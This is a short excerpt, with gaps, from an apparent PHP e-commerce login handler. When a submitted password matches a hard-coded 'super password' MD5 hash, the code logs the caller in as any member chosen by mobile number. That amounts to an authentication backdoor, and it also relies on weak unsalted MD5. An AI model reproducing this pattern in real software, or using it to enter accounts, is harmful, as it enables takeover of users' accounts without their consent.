	...
	public function indexOp() {
		...
		if ($result !== false) {
			...
			if (strcasecmp($supper_passwd, md5(trim($_POST['password']))) == 0) {
				$member_info = $model_member->getMemberInfo(array('member_mobile' => trim($_POST['user_name'])));
				if (empty($member_info)) {
					showDialog('用户不存在', '', 'error', $script);
				}

				// 自动登录
				$member_info['auto_login'] = $_POST['auto_login'];
				$model_member->createSession($member_info, false, false);
				if ($_GET['inajax'] == 1) {
